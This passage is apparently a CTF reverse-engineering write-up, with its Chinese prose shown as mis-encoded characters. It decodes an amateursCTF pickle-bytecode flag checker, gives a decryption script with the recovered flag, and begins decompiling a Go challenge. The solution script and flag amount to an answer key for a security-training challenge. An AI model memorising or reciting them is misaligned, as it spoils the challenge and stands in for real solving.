<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code = types.CodeType(</span><br><span class="line">    <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">67</span>, <span class="string">b&#x27;t\x00\xa0\x01|\x00d\x01\xa1\x02&#125;\x01t\x02|\x01\x83\x01d\x00d\x00d\x02\x85\x03\x19\x00d\x00d\x03\x85\x02\x19\x00&#125;\x00d\x04&#125;\x02t\x03d\x05t\x04|\x00\x83\x01d\x06\x83\x03D\x00]\x11&#125;\x03|\x02t\x05t\x00|\x00|\x03|\x03d\x06\x17\x00\x85\x02\x19\x00d\x07\x83\x02\x83\x017\x00&#125;\x02q\x1d|\x02S\x00&#x27;</span>,</span><br><span class="line">    (<span class="literal">None</span>, <span class="string">&#x27;big&#x27;</span>, -<span class="number">1</span>, -<span class="number">3</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>),</span><br><span class="line">    (<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;from_bytes&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;ğŸ”¥&#x27;</span>, <span class="string">&#x27;ğŸ¤«&#x27;</span>, <span class="string">&#x27;ğŸ§&#x27;</span>, <span class="string">&#x27;ğŸµ&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;dill-with-it&#x27;</span>, <span class="string">&#x27;ğŸ“®&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="string">b&#x27;\x00\x01\x0c\x01\x1a\x01\x04\x01\x14\x01 \x01&#x27;</span>,</span><br><span class="line">    (),</span><br><span class="line">    ()</span><br><span class="line">)</span><br><span class="line">func = types.FunctionType(code, <span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­çš„PYCå­—èŠ‚ç ç¿»è¯‘ä¸ºpythonä»£ç å«ä¹‰å¤§è‡´ä¸º(ç”¨è¿™ç§æ–¹å¼å®šä¹‰å‡½æ•°ä¸­ä½¿ç”¨åˆ«çš„å‡½æ•°æ—¶<code>LOAD_GLOBAL x</code>ä¸­çš„<code>x</code>å°±æ˜¯è¦ä½¿ç”¨çš„å‡½æ•°åœ¨é¢„å¤‡å‡½æ•°åˆ—è¡¨ä¸­çš„ä¸‹æ ‡ åœ¨è¿™é‡Œå°±æ˜¯<code>(&#39;int&#39;, &#39;from_bytes&#39;, &#39;bin&#39;, &#39;range&#39;, &#39;len&#39;, &#39;chr&#39;)[x]</code>):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decodea</span>(<span class="params">arg</span>):</span><br><span class="line">    binstr = <span class="built_in">bin</span>(<span class="built_in">int</span>.from_bytes(arg, <span class="string">&quot;big&quot;</span>))[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binstr), <span class="number">8</span>):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>(binstr[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(result, <span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å†çœ‹ä¸‹é¢çš„PVMå­—èŠ‚ç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  324: g    GET        0</span><br><span class="line">  327: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  338: \x85 TUPLE1</span><br><span class="line">  339: R    REDUCE</span><br><span class="line">  340: g    GET        0</span><br><span class="line">  343: C    SHORT_BINBYTES b&#x27;\x01.\xce\x966&#x27;</span><br><span class="line">  350: \x85 TUPLE1</span><br><span class="line">  351: R    REDUCE</span><br><span class="line">  352: \x93 STACK_GLOBAL</span><br><span class="line">  353: g    GET        0</span><br><span class="line">  356: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  367: \x85 TUPLE1</span><br><span class="line">  368: R    REDUCE</span><br><span class="line">  369: g    GET        0</span><br><span class="line">  372: C    SHORT_BINBYTES b&#x27;\x01\xa6&amp;\xf6\xc6v\xa6tN.\xce&#x27;</span><br><span class="line">  385: \x85 TUPLE1</span><br><span class="line">  386: R    REDUCE</span><br><span class="line">  387: \x93 STACK_GLOBAL</span><br><span class="line">  388: g    GET        0</span><br><span class="line">  391: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  402: \x85 TUPLE1</span><br><span class="line">  403: R    REDUCE</span><br><span class="line">  404: g    GET        0</span><br><span class="line">  407: C    SHORT_BINBYTES b&#x27;\x01.v\x96N\x0e&#x27;</span><br><span class="line">  415: \x85 TUPLE1</span><br><span class="line">  416: R    REDUCE</span><br><span class="line">  417: \x93 STACK_GLOBAL</span><br><span class="line">  418: V    UNICODE    &quot;What&#x27;s the flag? &quot;</span><br><span class="line">  437: \x85 TUPLE1</span><br><span class="line">  438: R    REDUCE</span><br><span class="line">  439: 0    POP</span><br><span class="line">  440: g    GET        0</span><br><span class="line">  443: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  454: \x85 TUPLE1</span><br><span class="line">  455: R    REDUCE</span><br><span class="line">  456: g    GET        0</span><br><span class="line">  459: C    SHORT_BINBYTES b&#x27;\x01.\xae\x0ev\x96&#x27;</span><br><span class="line">  467: \x85 TUPLE1</span><br><span class="line">  468: R    REDUCE</span><br><span class="line">  469: \x93 STACK_GLOBAL</span><br><span class="line">  470: V    UNICODE    &#x27;&gt; &#x27;</span><br><span class="line">  474: \x85 TUPLE1</span><br><span class="line">  475: R    REDUCE</span><br><span class="line">  476: \x85 TUPLE1</span><br><span class="line">  477: R    REDUCE</span><br><span class="line">  478: \x85 TUPLE1</span><br><span class="line">  479: R    REDUCE</span><br><span class="line">  480: \x94 MEMOIZE    (as 1)</span><br><span class="line">  481: 0    POP</span><br><span class="line">  482: g    GET        0</span><br><span class="line">  485: C    SHORT_BINBYTES b&#x27;\x01\xb6\xf6&amp;v\x86N&#x27;</span><br><span class="line">  494: \x85 TUPLE1</span><br><span class="line">  495: R    REDUCE</span><br><span class="line">  496: g    GET        0</span><br><span class="line">  499: C    SHORT_BINBYTES b&#x27;\x01&amp;\xa6\xa6\xce&#x27;</span><br><span class="line">  506: \x85 TUPLE1</span><br><span class="line">  507: R    REDUCE</span><br><span class="line">  508: \x93 STACK_GLOBAL</span><br><span class="line">  509: V    UNICODE    &#x27;five nights as freddy&#x27;</span><br><span class="line">  532: \x85 TUPLE1</span><br><span class="line">  533: R    REDUCE</span><br><span class="line">  534: 0    POP</span><br><span class="line">  535: g    GET        0</span><br><span class="line">  538: C    SHORT_BINBYTES b&#x27;\x01\xb6\xf6&amp;v\x86N&#x27;</span><br><span class="line">  547: \x85 TUPLE1</span><br><span class="line">  548: R    REDUCE</span><br><span class="line">  549: g    GET        0</span><br><span class="line">  552: C    SHORT_BINBYTES b&#x27;\x01\xa66ff\xae\x16\xce&#x27;</span><br><span class="line">  562: \x85 TUPLE1</span><br><span class="line">  563: R    REDUCE</span><br><span class="line">  564: \x93 STACK_GLOBAL</span><br><span class="line">  565: g    GET        1</span><br><span class="line">  568: \x85 TUPLE1</span><br><span class="line">  569: R    REDUCE</span><br><span class="line">  570: 0    POP</span><br><span class="line">  571: g    GET        0</span><br><span class="line">  574: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  585: \x85 TUPLE1</span><br><span class="line">  586: R    REDUCE</span><br><span class="line">  587: g    GET        0</span><br><span class="line">  590: C    SHORT_BINBYTES b&#x27;\x01.\xce\x966&#x27;</span><br><span class="line">  597: \x85 TUPLE1</span><br><span class="line">  598: R    REDUCE</span><br><span class="line">  599: \x93 STACK_GLOBAL</span><br><span class="line">  600: g    GET        0</span><br><span class="line">  603: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  614: \x85 TUPLE1</span><br><span class="line">  615: R    REDUCE</span><br><span class="line">  616: g    GET        0</span><br><span class="line">  619: C    SHORT_BINBYTES b&#x27;\x01\x0e\x86\xb6&#x27;</span><br><span class="line">  625: \x85 TUPLE1</span><br><span class="line">  626: R    REDUCE</span><br><span class="line">  627: \x93 STACK_GLOBAL</span><br><span class="line">  628: g    GET        0</span><br><span class="line">  631: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  642: \x85 TUPLE1</span><br><span class="line">  643: R    REDUCE</span><br><span class="line">  644: g    GET        0</span><br><span class="line">  647: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfaN\xf6\x1e\xfa\xfat.v\x96&#x27;</span><br><span class="line">  661: \x85 TUPLE1</span><br><span class="line">  662: R    REDUCE</span><br><span class="line">  663: \x93 STACK_GLOBAL</span><br><span class="line">  664: g    GET        0</span><br><span class="line">  667: C    SHORT_BINBYTES b&#x27;\x01\xb6\xf6&amp;v\x86N&#x27;</span><br><span class="line">  676: \x85 TUPLE1</span><br><span class="line">  677: R    REDUCE</span><br><span class="line">  678: g    GET        0</span><br><span class="line">  681: C    SHORT_BINBYTES b&#x27;\x01\xce\xa6.\x9eF&amp;v\x86N&#x27;</span><br><span class="line">  693: \x85 TUPLE1</span><br><span class="line">  694: R    REDUCE</span><br><span class="line">  695: \x93 STACK_GLOBAL</span><br><span class="line">  696: g    GET        0</span><br><span class="line">  699: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  710: \x85 TUPLE1</span><br><span class="line">  711: R    REDUCE</span><br><span class="line">  712: g    GET        0</span><br><span class="line">  715: C    SHORT_BINBYTES b&#x27;\x01v\xa66&#x27;</span><br><span class="line">  721: \x85 TUPLE1</span><br><span class="line">  722: R    REDUCE</span><br><span class="line">  723: \x93 STACK_GLOBAL</span><br><span class="line">  724: g    GET        1</span><br><span class="line">  727: \x85 TUPLE1</span><br><span class="line">  728: R    REDUCE</span><br><span class="line">  729: \x85 TUPLE1</span><br><span class="line">  730: R    REDUCE</span><br><span class="line">  731: g    GET        1</span><br><span class="line">  734: \x87 TUPLE3</span><br><span class="line">  735: R    REDUCE</span><br><span class="line">  736: \x85 TUPLE1</span><br><span class="line">  737: R    REDUCE</span><br><span class="line">  738: \x94 MEMOIZE    (as 2)</span><br><span class="line">  739: 0    POP</span><br><span class="line">  740: g    GET        0</span><br><span class="line">  743: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  754: \x85 TUPLE1</span><br><span class="line">  755: R    REDUCE</span><br><span class="line">  756: g    GET        0</span><br><span class="line">  759: C    SHORT_BINBYTES b&#x27;\x01\x9ev\x86&#x27;</span><br><span class="line">  765: \x85 TUPLE1</span><br><span class="line">  766: R    REDUCE</span><br><span class="line">  767: \x93 STACK_GLOBAL</span><br><span class="line">  768: g    GET        0</span><br><span class="line">  771: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  782: \x85 TUPLE1</span><br><span class="line">  783: R    REDUCE</span><br><span class="line">  784: g    GET        0</span><br><span class="line">  787: C    SHORT_BINBYTES b&#x27;\x01\x0e\x86\xb6&#x27;</span><br><span class="line">  793: \x85 TUPLE1</span><br><span class="line">  794: R    REDUCE</span><br><span class="line">  795: \x93 STACK_GLOBAL</span><br><span class="line">  796: g    GET        0</span><br><span class="line">  799: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  810: \x85 TUPLE1</span><br><span class="line">  811: R    REDUCE</span><br><span class="line">  812: g    GET        0</span><br><span class="line">  815: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfaN\xf6\x1e\xfa\xfat.v\x96&#x27;</span><br><span class="line">  829: \x85 TUPLE1</span><br><span class="line">  830: R    REDUCE</span><br><span class="line">  831: \x93 STACK_GLOBAL</span><br><span class="line">  832: (    MARK</span><br><span class="line">  833: I        INT        138</span><br><span class="line">  838: I        INT        13</span><br><span class="line">  842: I        INT        157</span><br><span class="line">  847: I        INT        66</span><br><span class="line">  851: I        INT        68</span><br><span class="line">  855: I        INT        12</span><br><span class="line">  859: I        INT        223</span><br><span class="line">  864: I        INT        147</span><br><span class="line">  869: I        INT        198</span><br><span class="line">  874: I        INT        223</span><br><span class="line">  879: I        INT        92</span><br><span class="line">  883: I        INT        172</span><br><span class="line">  888: I        INT        59</span><br><span class="line">  892: I        INT        56</span><br><span class="line">  896: I        INT        27</span><br><span class="line">  900: I        INT        117</span><br><span class="line">  905: I        INT        173</span><br><span class="line">  910: I        INT        21</span><br><span class="line">  914: I        INT        190</span><br><span class="line">  919: I        INT        210</span><br><span class="line">  924: I        INT        44</span><br><span class="line">  928: I        INT        194</span><br><span class="line">  933: I        INT        23</span><br><span class="line">  937: I        INT        169</span><br><span class="line">  942: I        INT        57</span><br><span class="line">  946: I        INT        136</span><br><span class="line">  951: I        INT        5</span><br><span class="line">  954: I        INT        120</span><br><span class="line">  959: I        INT        106</span><br><span class="line">  964: I        INT        255</span><br><span class="line">  969: I        INT        192</span><br><span class="line">  974: I        INT        98</span><br><span class="line">  978: I        INT        64</span><br><span class="line">  982: I        INT        124</span><br><span class="line">  987: I        INT        59</span><br><span class="line">  991: I        INT        18</span><br><span class="line">  995: I        INT        124</span><br><span class="line"> 1000: I        INT        97</span><br><span class="line"> 1004: I        INT        62</span><br><span class="line"> 1008: I        INT        168</span><br><span class="line"> 1013: I        INT        181</span><br><span class="line"> 1018: I        INT        61</span><br><span class="line"> 1022: I        INT        164</span><br><span class="line"> 1027: I        INT        22</span><br><span class="line"> 1031: I        INT        187</span><br><span class="line"> 1036: I        INT        251</span><br><span class="line"> 1041: I        INT        110</span><br><span class="line"> 1046: I        INT        214</span><br><span class="line"> 1051: I        INT        250</span><br><span class="line"> 1056: I        INT        218</span><br><span class="line"> 1061: I        INT        213</span><br><span class="line"> 1066: I        INT        71</span><br><span class="line"> 1070: I        INT        206</span><br><span class="line"> 1075: I        INT        159</span><br><span class="line"> 1080: I        INT        212</span><br><span class="line"> 1085: I        INT        169</span><br><span class="line"> 1090: I        INT        208</span><br><span class="line"> 1095: I        INT        21</span><br><span class="line"> 1099: I        INT        236</span><br><span class="line"> 1104: l        LIST       (MARK at 832)</span><br><span class="line"> 1105: g    GET        2</span><br><span class="line"> 1108: \x87 TUPLE3</span><br><span class="line"> 1109: R    REDUCE</span><br><span class="line"> 1110: \x85 TUPLE1</span><br><span class="line"> 1111: R    REDUCE</span><br><span class="line"> 1112: \x94 MEMOIZE    (as 3)</span><br><span class="line"> 1113: 0    POP</span><br><span class="line"> 1114: g    GET        0</span><br><span class="line"> 1117: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line"> 1128: \x85 TUPLE1</span><br><span class="line"> 1129: R    REDUCE</span><br><span class="line"> 1130: g    GET        0</span><br><span class="line"> 1133: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfaN\xf6\xfa\xfat.v\x96&#x27;</span><br><span class="line"> 1146: \x85 TUPLE1</span><br><span class="line"> 1147: R    REDUCE</span><br><span class="line"> 1148: \x93 STACK_GLOBAL</span><br><span class="line"> 1149: g    GET        3</span><br><span class="line"> 1152: g    GET        0</span><br><span class="line"> 1155: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line"> 1166: \x85 TUPLE1</span><br><span class="line"> 1167: R    REDUCE</span><br><span class="line"> 1168: g    GET        0</span><br><span class="line"> 1171: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfa\xa6v\xfa\xfat.v\x96&#x27;</span><br><span class="line"> 1184: \x85 TUPLE1</span><br><span class="line"> 1185: R    REDUCE</span><br><span class="line"> 1186: \x93 STACK_GLOBAL</span><br><span class="line"> 1187: g    GET        0</span><br><span class="line"> 1190: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line"> 1201: \x85 TUPLE1</span><br><span class="line"> 1202: R    REDUCE</span><br><span class="line"> 1203: g    GET        0</span><br><span class="line"> 1206: C    SHORT_BINBYTES b&#x27;\x01v\xa66&#x27;</span><br><span class="line"> 1212: \x85 TUPLE1</span><br><span class="line"> 1213: R    REDUCE</span><br><span class="line"> 1214: \x93 STACK_GLOBAL</span><br><span class="line"> 1215: g    GET        2</span><br><span class="line"> 1218: \x85 TUPLE1</span><br><span class="line"> 1219: R    REDUCE</span><br><span class="line"> 1220: I    INT        59</span><br><span class="line"> 1224: \x86 TUPLE2</span><br><span class="line"> 1225: R    REDUCE</span><br><span class="line"> 1226: \x86 TUPLE2</span><br><span class="line"> 1227: R    REDUCE</span><br><span class="line"> 1228: \x94 MEMOIZE    (as 4)</span><br><span class="line"> 1229: 0    POP</span><br><span class="line"> 1230: g    GET        0</span><br><span class="line"> 1233: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line"> 1244: \x85 TUPLE1</span><br><span class="line"> 1245: R    REDUCE</span><br><span class="line"> 1246: g    GET        0</span><br><span class="line"> 1249: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfa\xb6\xa6.\x96.\xa6\xe6\xfa\xfat.\xce\x966&#x27;</span><br><span class="line"> 1268: \x85 TUPLE1</span><br><span class="line"> 1269: R    REDUCE</span><br><span class="line"> 1270: \x93 STACK_GLOBAL</span><br><span class="line"> 1271: (    MARK</span><br><span class="line"> 1272: V        UNICODE    &#x27;Looks like you got it!&#x27;</span><br><span class="line"> 1296: V        UNICODE    &#x27;Wrong&#x27;</span><br><span class="line"> 1303: l        LIST       (MARK at 1271)</span><br><span class="line"> 1304: g    GET        4</span><br><span class="line"> 1307: \x86 TUPLE2</span><br><span class="line"> 1308: R    REDUCE</span><br><span class="line"> 1309: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br><span class="line">None</span><br></pre></td></tr></table></figure>

<p>å¤§é‡ä½¿ç”¨äº†ä¸€å¼€å§‹å®šä¹‰çš„å‡½æ•° ä¸”ä¼ å…¥çš„å‚æ•°ä¸ºç¼–ç è¿‡çš„å­—èŠ‚ä¸² é€šè¿‡è¿™ä¸ªå‡½æ•°æ¥è§£ç çš„åˆ°ä»¥ä¸‹å†…å®¹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;\x01.\xce\x966&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;list\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xa6&amp;\xf6\xc6v\xa6tN.\xce&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;str.encode\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01.v\x96N\x0e&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;print\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01.\xae\x0ev\x96&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;input\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xb6\xf6&amp;v\x86N&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;random\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01&amp;\xa6\xa6\xce&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;seed\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xa66ff\xae\x16\xce&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;shuffle\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\x0e\x86\xb6&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;map\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xfa\xfaN\xf6\x1e\xfa\xfat.v\x96&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;int.__xor__\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xce\xa6.\x9eF&amp;v\x86N&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;randbytes\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01v\xa66&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;len\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\x9ev\x86&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;any\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\x0e\x86\xb6&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;map\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xfa\xfaN\xf6\xfa\xfat.v\x96&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;int.__or__\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xfa\xfa\xa6v\xfa\xfat.v\x96&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;int.__ne__\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xfa\xfa\xb6\xa6.\x96.\xa6\xe6\xfa\xfat.\xce\x966&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;list.__getitem__\x01&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span> : <span class="built_in">bytearray</span>(<span class="string">b&#x27;builtins\x01&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ•´ä¸ªåŠ å¯†çš„æµç¨‹å°±å¾ˆç®€å•æ˜“æ‡‚äº† ä»¥ä¸‹æ˜¯å¤§è‡´åŠ å¯†æµç¨‹åŠè§£å¯†è¿‡ç¨‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encrypt</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">...</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">random.seed(<span class="string">&#x27;five nights as freddy&#x27;</span>)</span><br><span class="line">shuffle(flag)</span><br><span class="line">flag = <span class="built_in">list</span>(<span class="built_in">map</span>(xor, randbytes(<span class="built_in">len</span>(flag)), flag))</span><br><span class="line">table = [<span class="string">&quot;Right&quot;</span>, <span class="string">&quot;Wrong&quot;</span>]</span><br><span class="line">enc = [<span class="number">138</span>, <span class="number">13</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">12</span>, <span class="number">223</span>, <span class="number">147</span>, <span class="number">198</span>, <span class="number">223</span>, <span class="number">92</span>, <span class="number">172</span>, <span class="number">59</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">117</span>, <span class="number">173</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">210</span>, <span class="number">44</span>, <span class="number">194</span>, <span class="number">23</span>, <span class="number">169</span>, <span class="number">57</span>, <span class="number">136</span>, <span class="number">5</span>, <span class="number">120</span>, <span class="number">106</span>, <span class="number">255</span>, <span class="number">192</span>, <span class="number">98</span>, <span class="number">64</span>, <span class="number">124</span>, <span class="number">59</span>, <span class="number">18</span>, <span class="number">124</span>, <span class="number">97</span>, <span class="number">62</span>, <span class="number">168</span>, <span class="number">181</span>, <span class="number">61</span>, <span class="number">164</span>, <span class="number">22</span>, <span class="number">187</span>, <span class="number">251</span>, <span class="number">110</span>, <span class="number">214</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">213</span>, <span class="number">71</span>, <span class="number">206</span>, <span class="number">159</span>, <span class="number">212</span>, <span class="number">169</span>, <span class="number">208</span>, <span class="number">21</span>, <span class="number">236</span>]</span><br><span class="line"><span class="keyword">return</span> table[<span class="built_in">any</span>(<span class="built_in">map</span>(xor, flag, enc)) || <span class="built_in">len</span>(flag) != <span class="number">59</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="string">&#x27;five nights as freddy&#x27;</span>)</span><br><span class="line"><span class="comment"># randby = list(random.randbytes(59))</span></span><br><span class="line">table = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">59</span>)]</span><br><span class="line">random.shuffle(table)</span><br><span class="line">enc = [<span class="number">138</span>, <span class="number">13</span>, <span class="number">157</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">12</span>, <span class="number">223</span>, <span class="number">147</span>, <span class="number">198</span>, <span class="number">223</span>, <span class="number">92</span>, <span class="number">172</span>, <span class="number">59</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">117</span>, <span class="number">173</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">210</span>, <span class="number">44</span>, <span class="number">194</span>, <span class="number">23</span>, <span class="number">169</span>, <span class="number">57</span>, <span class="number">136</span>, <span class="number">5</span>, <span class="number">120</span>, <span class="number">106</span>, <span class="number">255</span>, <span class="number">192</span>, <span class="number">98</span>, <span class="number">64</span>, <span class="number">124</span>, <span class="number">59</span>, <span class="number">18</span>, <span class="number">124</span>, <span class="number">97</span>, <span class="number">62</span>, <span class="number">168</span>, <span class="number">181</span>, <span class="number">61</span>, <span class="number">164</span>, <span class="number">22</span>, <span class="number">187</span>, <span class="number">251</span>, <span class="number">110</span>, <span class="number">214</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">213</span>, <span class="number">71</span>, <span class="number">206</span>, <span class="number">159</span>, <span class="number">212</span>, <span class="number">169</span>, <span class="number">208</span>, <span class="number">21</span>, <span class="number">236</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a ^ b</span><br><span class="line"></span><br><span class="line">reslut = <span class="built_in">list</span>(<span class="built_in">map</span>(xor, enc, random.randbytes(<span class="number">59</span>)))</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">59</span>):</span><br><span class="line">    flag += (<span class="built_in">chr</span>(reslut[table.index(i)]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># amateursCTF&#123;p1ckL3-is_not_the_goat_l4rrY_is_m0R3_\:goat:ed&#125;</span></span><br></pre></td></tr></table></figure>

<p>é™¤äº†è¿™ç§é™æ€åˆ†æçš„åšæ³•è¿˜æœ‰ä¸€ç§å¯ä»¥åŠ¨è°ƒçš„åšæ³• ä½¿ç”¨<a href="https://github.com/Legoclones/pickledbg">pickledbg</a></p>
<h2 id="gogogaga-Goè¯­è¨€é€†å‘-Goå¤šçº¿ç¨‹è°ƒè¯•"><a href="#gogogaga-Goè¯­è¨€é€†å‘-Goå¤šçº¿ç¨‹è°ƒè¯•" class="headerlink" title="gogogaga | Goè¯­è¨€é€†å‘ | Goå¤šçº¿ç¨‹è°ƒè¯•"></a>gogogaga | Goè¯­è¨€é€†å‘ | Goå¤šçº¿ç¨‹è°ƒè¯•</h2><p>IDA8.3æ‰“å¼€ç”¨äºé™æ€åˆ†æ æ£€æŸ¥å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.checkKey</span></span><br><span class="line"><span class="type">bool</span> __golang <span class="title function_">main_checkKey</span><span class="params">(<span class="built_in">string</span> key)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// r14</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// rbx</span></span><br><span class="line">  runtime_funcval *v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v9; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v10; <span class="comment">// r11</span></span><br><span class="line">  runtime_funcval *v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v13; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v14; <span class="comment">// r11</span></span><br><span class="line">  runtime_funcval *v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v17; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v18; <span class="comment">// r11</span></span><br><span class="line">  runtime_funcval *v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v21; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD *v22; <span class="comment">// r11</span></span><br><span class="line">  runtime_funcval *v23; <span class="comment">// rax</span></span><br><span class="line">  __int64 v24; <span class="comment">// rcx</span></span><br><span class="line">  runtime_hchan *v25; 